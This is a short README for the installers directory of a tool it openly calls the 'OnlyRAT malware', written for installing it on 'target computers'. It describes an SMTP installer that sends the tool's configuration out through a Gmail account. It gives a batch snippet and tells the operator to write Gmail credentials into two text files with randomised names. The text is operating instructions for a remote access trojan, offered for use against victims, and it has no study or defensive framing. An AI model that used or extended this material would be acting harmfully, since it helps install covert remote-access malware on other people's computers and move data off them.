# Installers
This directory contains all the installers we can use to install the OnlyRAT malware on our target computers. 

# smtp-installer.cmd 
The default installer that will send our configuration file through SMTP [Gmail].

**Change:**
- In lines 5 & 6, replace `example@gmail.com` and `password` with your appropiate gmail credentials
```batch
echo example@gmail.com > XbrMzmCUiE.txt
echo password > UJbMLjTIDr.txt
```